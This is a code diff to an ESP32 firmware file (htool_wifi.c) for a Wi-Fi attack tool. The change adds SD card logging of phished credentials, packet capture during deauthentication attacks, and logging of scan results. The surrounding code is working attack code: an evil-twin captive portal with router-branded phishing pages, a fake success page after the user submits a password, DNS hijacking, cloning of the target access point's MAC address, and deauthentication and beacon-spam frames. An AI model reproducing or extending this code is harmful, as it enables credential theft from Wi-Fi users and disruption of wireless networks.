@@ -1,6 +1,6 @@
 /*
- * htool_wifi.c - EVIL TWIN FIXED + MAC CLONING SUPPORT
- * Fixed for ESP-IDF v4.3 (Removed esp_mac.h)
+ * htool_wifi.c - EVIL TWIN + DEAUTH + SD LOGGING (PCAP/CSV)
+ * Fully merged version.
  */
 #include <string.h>
 #include "htool_wifi.h"
@@ -10,7 +10,7 @@
 #include "htool_api.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
-#include "esp_system.h" // esp_base_mac_addr_set is here in IDF 4.x
+#include "esp_system.h" 
 #include "lwip/sockets.h"
 #include "lwip/err.h"
 #include "esp_netif.h"
@@ -18,7 +18,8 @@
 #include "lwip/sys.h"
 #include "lwip/netdb.h"
 #include "esp_http_server.h"
-#include "esp_log.h" 
+#include "esp_log.h"
+#include "htool_sd.h" // [NEW] SD Card Support
 
 #define TAG "htool_wifi"
 
@@ -132,6 +133,17 @@ typedef struct sockaddr_in sockaddr_in_t;
 httpd_handle_t server;
 int sock = 0;
 
+// [NEW] PCAP Sniffer Callback
+static void wifi_promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    
+    // Write packet if SD is available
+    if (htool_sd_is_mounted()) {
+        htool_sd_write_packet(pkt->payload, pkt->rx_ctrl.sig_len);
+    }
+}
+
 void htool_wifi_reset_creds() { cred_user_len = 0; cred_pw_len = 0; }
 char *htool_wifi_get_pw_cred() { return cred_pw; }
 char *htool_wifi_get_user_cred() { return cred_user; }
@@ -140,7 +152,7 @@ uint32_t htool_wifi_get_user_cred_len() { return cred_user_len; }
 
 // --- Helper: Chunked HTML Sender ---
 static esp_err_t send_chunked_html(httpd_req_t *req, const char *start, size_t len) {
-    const size_t chunk_size = 1024; // Send 1KB at a time
+    const size_t chunk_size = 1024; 
     size_t remaining = len;
     const char *ptr = start;
 
@@ -157,7 +169,6 @@ esp_err_t common_get_handler(httpd_req_t *req) {
     uint32_t len = 0;
     const char *start = NULL; 
 
-    // --- Original IF-ELSE Template Logic ---
     if (captive_portal_task_args.is_evil_twin) {
         if (captive_portal_task_args.cp_index == 0) { len = html_router_end - html_router_start; start = html_router_start; }
         else if (captive_portal_task_args.cp_index == 1) { len = html_huawei_end - html_huawei_start; start = html_huawei_start; }
@@ -186,7 +197,6 @@ esp_err_t common_get_handler(httpd_req_t *req) {
     char req_hdr_host_value[req_hdr_host_len + 1];
     httpd_req_get_hdr_value_str(req, "Host", (char*)&req_hdr_host_value, req_hdr_host_len + 1);
 
-    // FIX: Redirect to 192.168.4.1
     if (strncmp(req_hdr_host_value, "connectivitycheck.gstatic.com", strlen("connectivitycheck.gstatic.com")) == 0) {
         httpd_resp_set_status(req, "302 Found");
         httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
@@ -194,15 +204,14 @@ esp_err_t common_get_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    // --- FIX: CREDENTIAL PARSING & SUCCESS PAGE ---
+    // --- CREDENTIAL PARSING & LOGGING ---
     size_t buf_len = httpd_req_get_url_query_len(req) + 1;
     if (buf_len > 1) {
         char *buf = malloc(buf_len);
         if (buf) {
             if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
-                ESP_LOGI(TAG, "Credentials captured: %s", buf);
+                ESP_LOGI(TAG, "Parsing Query: %s", buf);
                 
-                // 1. Parse 'user=' (match HTML name)
                 char *usr_ptr = strstr(buf, "user="); 
                 if(usr_ptr) { 
                    strncpy(cred_user, usr_ptr + 5, MAX_USER_LEN);
@@ -211,7 +220,6 @@ esp_err_t common_get_handler(httpd_req_t *req) {
                    cred_user_len = strlen(cred_user); 
                 }
                 
-                // 2. Parse 'pass=' (match HTML name)
                 char *pw_ptr = strstr(buf, "pass=");
                 if(pw_ptr) { 
                     strncpy(cred_pw, pw_ptr + 5, MAX_PW_LEN);
@@ -220,7 +228,11 @@ esp_err_t common_get_handler(httpd_req_t *req) {
                     cred_pw_len = strlen(cred_pw); 
                 }
 
-                // 3. Send Success Page Immediately
+                // [NEW] Log to SD
+                if (htool_sd_is_mounted() && cred_user_len > 0) {
+                    htool_sd_log_cred("CaptivePortal", cred_user, cred_pw);
+                }
+
                 const char* success_html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head><body><h2 style='text-align:center; margin-top:50px;'>Connection Successful!</h2><p style='text-align:center;'>You are now connected.</p></body></html>";
                 httpd_resp_set_type(req, "text/html");
                 httpd_resp_send(req, success_html, strlen(success_html));
@@ -232,7 +244,6 @@ esp_err_t common_get_handler(httpd_req_t *req) {
     }
 
     httpd_resp_set_type(req, "text/html");
-    // Use Chunked Sender for large files
     if (start != NULL) return send_chunked_html(req, start, len);
     return httpd_resp_send(req, NULL, 0);
 }
@@ -308,8 +319,6 @@ static int parse_dns_request(char *req, size_t req_len, char *dns_reply, size_t 
             answer->class = htons(ntohs(question->class));
             answer->ttl = htonl(ANS_TTL_SEC);
             esp_netif_ip_info_t ip_info;
-            
-            // FIX: Use netif_ap to get IP
             if (netif_ap) {
                 esp_netif_get_ip_info(netif_ap, &ip_info);
                 answer->addr_len = htons(sizeof(ip_info.ip.addr));
@@ -361,6 +370,9 @@ void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id
 }
 
 void htool_wifi_captive_portal_start(void *pvParameters) {
+    // [NEW] Init SD for cred logging
+    htool_sd_init();
+
     esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
     esp_wifi_stop();
     wifi_config_t wifi_config = {0};
@@ -371,7 +383,6 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
         wifi_config.ap.authmode = WIFI_AUTH_OPEN;
         wifi_config.ap.max_connection = 4;
         
-        // --- NEW: MAC Cloning Logic ---
         if (captive_portal_task_args.clone_mac) {
              esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
         }
@@ -387,7 +398,6 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
         wifi_config.ap.max_connection = 4;
    }
 
-    // --- FIX: DHCP & IP Force Restart ---
     esp_netif_ip_info_t ip_info;
     IP4_ADDR(&ip_info.ip, 192, 168, 4, 1);
     IP4_ADDR(&ip_info.gw, 192, 168, 4, 1);
@@ -417,7 +427,7 @@ void htool_wifi_captive_portal_stop() {
     htool_set_wifi_sta_config(); 
 }
 
-// --- Beacon/Deauth/Scan (Unchanged) ---
+// --- Beacon/Deauth/Scan ---
 uint8_t beacon_packet[57] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x32, 0x00, 0x01, 0x04, 0x00 };
 static uint8_t deauth_packet[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00 };
 char beacon_random[] = "1234567890qwertzuiopasdfghjklyxcvbnm QWERTZUIOPASDFGHJKLYXCVBNM_";
@@ -569,6 +579,8 @@ void deauther_task() {
     }
     vTaskDelete(NULL);
 }
+
+// [UPDATED] Start Deauth + Sniffer
 void htool_wifi_start_deauth() {
     if (perform_passive_scan || perform_active_scan) {
         ESP_LOGI(TAG, "Scan in progress, stop the scan");
@@ -576,12 +588,30 @@ void htool_wifi_start_deauth() {
         esp_wifi_scan_stop();
         scan_started = false;
     }
+    
+    // 1. Setup SD & PCAP
+    htool_sd_init();
+    htool_sd_open_pcap();
+
+    // 2. Start Promiscuous Sniffer
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_rx_cb);
+    esp_wifi_set_promiscuous(true);
+
     xTaskCreatePinnedToCore(deauther_task, "deauth", 1024, NULL, 1, NULL, 0);
 }
+
+// [NEW] Stop Deauth + Sniffer
+void htool_wifi_stop_deauth() {
+    esp_wifi_set_promiscuous(false);
+    htool_sd_close_pcap();
+}
+
 void htool_wifi_start_active_scan() { perform_active_scan = true; }
 void htool_wifi_start_passive_scan() { perform_passive_scan = true; }
 
-// --- PATCH: SCAN + MESH LOGIC ---
+// --- Scan Task with Logging ---
 static void wifi_handling_task(void *pvParameters) {
     wifi_scan_config_t scan_conf;
     EventBits_t uxBits;
@@ -605,6 +635,19 @@ static void wifi_handling_task(void *pvParameters) {
                 }
                 esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                 global_scans_count = global_scans_num; global_scans_num = 32;
+                
+                // [NEW] Log Results
+                if(htool_sd_is_mounted()) {
+                    for(int i=0; i<global_scans_count; i++) {
+                        char bssid_str[18];
+                        sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
+                                global_scans[i].bssid[0], global_scans[i].bssid[1],
+                                global_scans[i].bssid[2], global_scans[i].bssid[3],
+                                global_scans[i].bssid[4], global_scans[i].bssid[5]);
+                        htool_sd_log_scan((char*)global_scans[i].ssid, bssid_str, global_scans[i].rssi, global_scans[i].primary);
+                    }
+                }
+
                 perform_active_scan = false; scan_started = false; 
             } else {
                 perform_active_scan = false; scan_started = false; ESP_LOGE(TAG, "Scan timeout");
@@ -627,6 +670,19 @@ static void wifi_handling_task(void *pvParameters) {
                 }
                 esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                 global_scans_count = global_scans_num; global_scans_num = 32;
+                
+                // [NEW] Log Results
+                if(htool_sd_is_mounted()) {
+                    for(int i=0; i<global_scans_count; i++) {
+                        char bssid_str[18];
+                        sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
+                                global_scans[i].bssid[0], global_scans[i].bssid[1],
+                                global_scans[i].bssid[2], global_scans[i].bssid[3],
+                                global_scans[i].bssid[4], global_scans[i].bssid[5]);
+                        htool_sd_log_scan((char*)global_scans[i].ssid, bssid_str, global_scans[i].rssi, global_scans[i].primary);
+                    }
+                }
+
                 perform_passive_scan = false; scan_started = false;
             } else {
                 perform_passive_scan = false; scan_started = false; ESP_LOGE(TAG, "Scan timeout");
@@ -699,21 +755,19 @@ int htool_wifi_init() {
     nvsm_init();
     ESP_ERROR_CHECK(esp_netif_init());
 
-    // --- PATCH: INIT NETIFS SEPARATELY ---
     netif_ap = esp_netif_create_default_wifi_ap();
     netif_sta = esp_netif_create_default_wifi_sta();
     
-    // Default to STA for scanning
     wifi_client->esp_netif = netif_sta;
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
     ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
     esp_wifi_set_mode(WIFI_MODE_STA);
+    
+    // NOTE: Removed promiscuous(true) from here to save resources. 
+    // It is now enabled only in start_deauth()
     esp_wifi_set_channel(0, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_set_promiscuous(true);
-
-    // ESP_ERROR_CHECK(esp_wifi_set_country(&ccconf));
 
     ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));
     ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler, NULL));
